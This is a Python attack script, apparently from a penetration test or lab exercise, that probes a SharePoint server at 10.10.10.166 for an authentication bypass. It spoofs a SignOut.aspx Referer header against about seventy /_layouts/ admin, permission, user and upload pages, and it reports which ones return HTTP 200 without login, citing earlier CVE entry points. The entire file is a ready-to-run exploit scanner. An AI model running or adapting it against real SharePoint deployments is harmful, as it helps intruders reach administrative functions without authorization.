#!/usr/bin/env python3
# Purpose: Comprehensive test of ALL /_layouts/ endpoints with SignOut Referer
# Outcome: Find any additional bypassed endpoints beyond the 3 already identified

import requests

target = "http://10.10.10.166"

# Comprehensive list of /_layouts/ endpoints from SharePoint
# Including historical CVE entry points and common admin/management pages
layouts_endpoints = [
    # Already tested and confirmed bypassed
    "/_layouts/15/listedit.aspx",
    "/_layouts/15/Picker.aspx", 
    "/_layouts/15/ToolPane.aspx",  # Should be blocked
    
    # Site administration
    "/_layouts/15/settings.aspx",
    "/_layouts/15/viewlsts.aspx",
    "/_layouts/15/user.aspx",
    "/_layouts/15/people.aspx",
    "/_layouts/15/groups.aspx",
    "/_layouts/15/perm.aspx",
    "/_layouts/15/role.aspx",
    "/_layouts/15/permsetup.aspx",
    "/_layouts/15/newgrp.aspx",
    "/_layouts/15/editgrp.aspx",
    "/_layouts/15/editprms.aspx",
    
    # List/library management
    "/_layouts/15/listedit.aspx",
    "/_layouts/15/listfeed.aspx",
    "/_layouts/15/listgeneralsettings.aspx",
    "/_layouts/15/lstsetng.aspx",
    "/_layouts/15/versiondiff.aspx",
    "/_layouts/15/versions.aspx",
    
    # Content types and site columns
    "/_layouts/15/mngctype.aspx",
    "/_layouts/15/ctypedit.aspx",
    "/_layouts/15/mngfield.aspx",
    "/_layouts/15/FldEdit.aspx",
    
    # Web part management
    "/_layouts/15/storman.aspx",
    "/_layouts/15/gallery.aspx",
    "/_layouts/15/wpPicker.aspx",
    "/_layouts/15/WPAdder.aspx",
    
    # Historical CVE entry points
    "/_layouts/15/quicklinks.aspx",  # CVE-2020-1147
    "/_layouts/15/quicklinksdialogform.aspx",  # CVE-2020-1147
    "/_layouts/15/Picker.aspx",  # CVE-2019-0604
    "/_layouts/15/itemPicker.aspx",
    
    # User profile and personalization
    "/_layouts/15/myinfo.aspx",
    "/_layouts/15/PersonalInformation.aspx",
    "/_layouts/15/editprofile.aspx",
    "/_layouts/15/userdisp.aspx",
    
    # Site features and solutions
    "/_layouts/15/ManageFeatures.aspx",
    "/_layouts/15/solutions.aspx",
    "/_layouts/15/sitemanager.aspx",
    
    # Search and indexing
    "/_layouts/15/searchadmin.aspx",
    "/_layouts/15/searchresults.aspx",
    "/_layouts/15/osssearchresults.aspx",
    
    # Workflow and forms
    "/_layouts/15/Workflow.aspx",
    "/_layouts/15/WrkStat.aspx",
    "/_layouts/15/WrkSetng.aspx",
    "/_layouts/15/AddAnApp.aspx",
    
    # Site creation and management
    "/_layouts/15/sitemanager.aspx",
    "/_layouts/15/create.aspx",
    "/_layouts/15/newsbweb.aspx",
    "/_layouts/15/mngsiteadmin.aspx",
    
    # Page editing
    "/_layouts/15/editform.aspx",
    "/_layouts/15/newform.aspx",
    "/_layouts/15/dispform.aspx",
    
    # Mobile and app management
    "/_layouts/15/mobile/view.aspx",
    "/_layouts/15/appinv.aspx",
    "/_layouts/15/appprincipals.aspx",
    
    # Other administrative pages
    "/_layouts/15/aclinv.aspx",
    "/_layouts/15/accessdenied.aspx",
    "/_layouts/15/error.aspx",
    "/_layouts/15/confirmation.aspx",
    "/_layouts/15/images.aspx",
    "/_layouts/15/upload.aspx",
    
    # Variations without /15/
    "/_layouts/Picker.aspx",
    "/_layouts/listedit.aspx",
    "/_layouts/settings.aspx",
]

# Remove duplicates
layouts_endpoints = list(set(layouts_endpoints))

print(f"Testing {len(layouts_endpoints)} /_layouts/ endpoints with SignOut Referer bypass")
print("="*80)

bypassed = []
blocked = []
errors = []

for endpoint in sorted(layouts_endpoints):
    url = f"{target}{endpoint}"
    headers = {"Referer": "/_layouts/SignOut.aspx"}
    
    try:
        response = requests.get(url, headers=headers, allow_redirects=False, timeout=5)
        
        if response.status_code == 200:
            bypassed.append(endpoint)
            status_icon = "✅"
        elif response.status_code == 401:
            blocked.append(endpoint)
            status_icon = "🔒"
        elif response.status_code == 403:
            blocked.append(endpoint)
            status_icon = "🔒"
        elif response.status_code == 404:
            status_icon = "❌"
        elif response.status_code == 500:
            errors.append(endpoint)
            status_icon = "⚠️"
        else:
            status_icon = f"❓({response.status_code})"
        
        print(f"{status_icon} {endpoint}")
        
    except Exception as e:
        print(f"💥 {endpoint} - {str(e)[:30]}")

print("\n" + "="*80)
print(f"\n✅ BYPASSED ENDPOINTS ({len(bypassed)}):")
for ep in sorted(bypassed):
    print(f"  - {ep}")

print(f"\n⚠️  ERROR ENDPOINTS ({len(errors)}):")
for ep in sorted(errors):
    print(f"  - {ep}")

print(f"\n🔒 BLOCKED ENDPOINTS: {len(blocked)}")
print(f"❌ NOT FOUND: {len(layouts_endpoints) - len(bypassed) - len(blocked) - len(errors)}")

print("\n" + "="*80)
print("SUMMARY:")
print(f"  Total tested: {len(layouts_endpoints)}")
print(f"  Bypassed: {len(bypassed)}")
print(f"  Blocked: {len(blocked)}")
print(f"  Errors: {len(errors)}")
